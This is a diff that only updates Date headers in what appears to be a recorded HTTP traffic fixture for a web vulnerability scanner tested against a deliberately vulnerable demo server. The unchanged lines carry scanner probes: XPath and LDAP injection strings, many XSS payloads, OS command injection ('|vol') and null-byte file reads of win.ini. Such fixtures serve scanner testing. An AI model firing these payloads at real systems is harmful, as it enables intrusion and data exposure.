-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13047,7 +13047,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+and+%27barfoo%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13081,7 +13081,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+or+%27foobar%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 227
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13115,7 +13115,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+or+%27barfoo%27%3D%27foobar
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13152,7 +13152,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13183,7 +13183,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+%2B+%27%27+%2B+%27
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13215,7 +13215,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+%2B+%27+%2B+%27
 HTTP/1.1 200 OK
 Content-Length: 540
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13251,7 +13251,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+%2B+%27%27+%2B+%27
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13285,7 +13285,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+%2B+%27+%2B+%27
 HTTP/1.1 200 OK
 Content-Length: 540
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13323,7 +13323,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27+%2B+%27%27+%2B+%27
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:52:16 GMT
+Date: Mon, 1 Dec 2014 14:52:16 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13366,7 +13366,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13397,7 +13397,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25424)%22&gt;
 HTTP/1.1 200 OK
 Content-Length: 571
-Date: Mon, 15 Sep 2014 14:47:27 GMT
+Date: Mon, 1 Dec 2014 14:47:27 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13440,7 +13440,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13471,7 +13471,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25426)&gt;
 HTTP/1.1 200 OK
 Content-Length: 624
-Date: Mon, 15 Sep 2014 14:47:27 GMT
+Date: Mon, 1 Dec 2014 14:47:27 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13514,7 +13514,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13545,7 +13545,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=&gt;'&gt;&lt;script&gt;alert(25432)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 564
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13588,7 +13588,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13619,7 +13619,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=&gt;'&gt;&lt;%00script&gt;alert(25436)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 565
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13662,7 +13662,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13693,7 +13693,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=&gt;"&gt;&lt;%00script&gt;alert(25438)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 565
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13736,7 +13736,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13767,7 +13767,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825448%29%3E
 HTTP/1.1 200 OK
 Content-Length: 570
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13810,7 +13810,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13841,7 +13841,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27%22%3E%3Cscript%3Ealert(25452)%3C%2Fscript%3E
 HTTP/1.1 200 OK
 Content-Length: 563
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13884,7 +13884,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13915,7 +13915,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25468)&gt;HoverMe&lt;/A&gt;
 HTTP/1.1 200 OK
 Content-Length: 583
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13962,7 +13962,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -13993,7 +13993,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27
 HTTP/1.1 200 OK
 Content-Length: 532
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14036,7 +14036,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14067,7 +14067,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=\'
 HTTP/1.1 200 OK
 Content-Length: 533
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14110,7 +14110,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14141,7 +14141,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%00
 HTTP/1.1 200 OK
 Content-Length: 533
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14189,7 +14189,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14220,7 +14220,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E
 HTTP/1.1 200 OK
 Content-Length: 571
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14268,7 +14268,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 212
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14299,7 +14299,7 @@ Referer: http://tftarget/demo/XPathInjection.php
 username=&amp;password=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E
 HTTP/1.1 200 OK
 Content-Length: 560
-Date: Mon, 15 Sep 2014 14:47:28 GMT
+Date: Mon, 1 Dec 2014 14:47:28 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14333,7 +14333,7 @@ Referer: http://tftarget/demo/XPathInjection2.php
 
 HTTP/1.1 404 Not Found
 Content-Length: 210
-Date: Mon, 15 Sep 2014 14:47:29 GMT
+Date: Mon, 1 Dec 2014 14:47:29 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -14370,7 +14370,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 204
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14401,7 +14401,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=\'&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 343
-Date: Mon, 15 Sep 2014 14:47:29 GMT
+Date: Mon, 1 Dec 2014 14:47:29 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14442,7 +14442,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 204
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14473,7 +14473,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=\"&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 343
-Date: Mon, 15 Sep 2014 14:47:29 GMT
+Date: Mon, 1 Dec 2014 14:47:29 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14514,7 +14514,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 204
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14545,7 +14545,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=)&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 343
-Date: Mon, 15 Sep 2014 14:47:29 GMT
+Date: Mon, 1 Dec 2014 14:47:29 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14586,7 +14586,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 204
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14617,7 +14617,7 @@ Referer: http://tftarget/demo/LDAPInjection.php
 username=%00&amp;password=
 HTTP/1.1 200 OK
 Content-Length: 343
-Date: Mon, 15 Sep 2014 14:47:29 GMT
+Date: Mon, 1 Dec 2014 14:47:29 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14662,7 +14662,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=
 HTTP/1.1 200 OK
 Content-Length: 221
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14693,7 +14693,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=C:\windows\win.ini%00.html
 HTTP/1.1 200 OK
 Content-Length: 699
-Date: Mon, 15 Sep 2014 14:47:33 GMT
+Date: Mon, 1 Dec 2014 14:47:33 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14764,7 +14764,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=
 HTTP/1.1 200 OK
 Content-Length: 221
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14795,7 +14795,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=C:\windows\win.ini
 HTTP/1.1 200 OK
 Content-Length: 699
-Date: Mon, 15 Sep 2014 14:48:18 GMT
+Date: Mon, 1 Dec 2014 14:48:18 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14866,7 +14866,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=
 HTTP/1.1 200 OK
 Content-Length: 221
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14897,7 +14897,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=C:\windows\win.ini%00
 HTTP/1.1 200 OK
 Content-Length: 699
-Date: Mon, 15 Sep 2014 14:48:34 GMT
+Date: Mon, 1 Dec 2014 14:48:34 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -14972,7 +14972,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=
 HTTP/1.1 200 OK
 Content-Length: 221
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15003,7 +15003,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=%7Cvol
 HTTP/1.1 200 OK
 Content-Length: 283
-Date: Mon, 15 Sep 2014 14:48:34 GMT
+Date: Mon, 1 Dec 2014 14:48:34 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15044,7 +15044,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=
 HTTP/1.1 200 OK
 Content-Length: 221
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15075,7 +15075,7 @@ Referer: http://tftarget/demo/OSCommandInjection.php
 fileName=%7C%7Cvol
 HTTP/1.1 200 OK
 Content-Length: 283
-Date: Mon, 15 Sep 2014 14:48:34 GMT
+Date: Mon, 1 Dec 2014 14:48:34 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15120,7 +15120,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15150,7 +15150,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234--&gt;&lt;script&gt;alert(26630)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 231
-Date: Mon, 15 Sep 2014 14:48:35 GMT
+Date: Mon, 1 Dec 2014 14:48:35 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15188,7 +15188,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15218,7 +15218,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234&gt;'&gt;&lt;script&gt;alert(26632)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 231
-Date: Mon, 15 Sep 2014 14:48:35 GMT
+Date: Mon, 1 Dec 2014 14:48:35 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15256,7 +15256,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15286,7 +15286,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234&gt;'&gt;&lt;%00script&gt;alert(26636)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 232
-Date: Mon, 15 Sep 2014 14:48:35 GMT
+Date: Mon, 1 Dec 2014 14:48:35 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15324,7 +15324,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15354,7 +15354,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234&lt;/TextArea&gt;&lt;script&gt;alert(26656)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 239
-Date: Mon, 15 Sep 2014 14:48:36 GMT
+Date: Mon, 1 Dec 2014 14:48:36 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15392,7 +15392,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15422,7 +15422,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-
 HTTP/1.1 200 OK
 Content-Length: 274
-Date: Mon, 15 Sep 2014 14:48:36 GMT
+Date: Mon, 1 Dec 2014 14:48:36 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15460,7 +15460,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15490,7 +15490,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234*/--&gt;&lt;/script&gt;&lt;script&gt;alert(26682)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 242
-Date: Mon, 15 Sep 2014 14:48:36 GMT
+Date: Mon, 1 Dec 2014 14:48:36 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15532,7 +15532,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command=1234
 HTTP/1.1 200 OK
 Content-Length: 199
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15562,7 +15562,7 @@ Referer: http://tftarget/demo/EvalInjection.php
 command="
 HTTP/1.1 200 OK
 Content-Length: 503
-Date: Mon, 15 Sep 2014 14:48:38 GMT
+Date: Mon, 1 Dec 2014 14:48:38 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15608,7 +15608,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15641,7 +15641,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(26968)%22&gt;
 HTTP/1.1 200 OK
 Content-Length: 268
-Date: Mon, 15 Sep 2014 14:48:38 GMT
+Date: Mon, 1 Dec 2014 14:48:38 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15682,7 +15682,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15715,7 +15715,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(26970)&gt;
 HTTP/1.1 200 OK
 Content-Length: 321
-Date: Mon, 15 Sep 2014 14:48:38 GMT
+Date: Mon, 1 Dec 2014 14:48:38 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15756,7 +15756,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15789,7 +15789,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=--&gt;&lt;script&gt;alert(26974)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 261
-Date: Mon, 15 Sep 2014 14:48:38 GMT
+Date: Mon, 1 Dec 2014 14:48:38 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
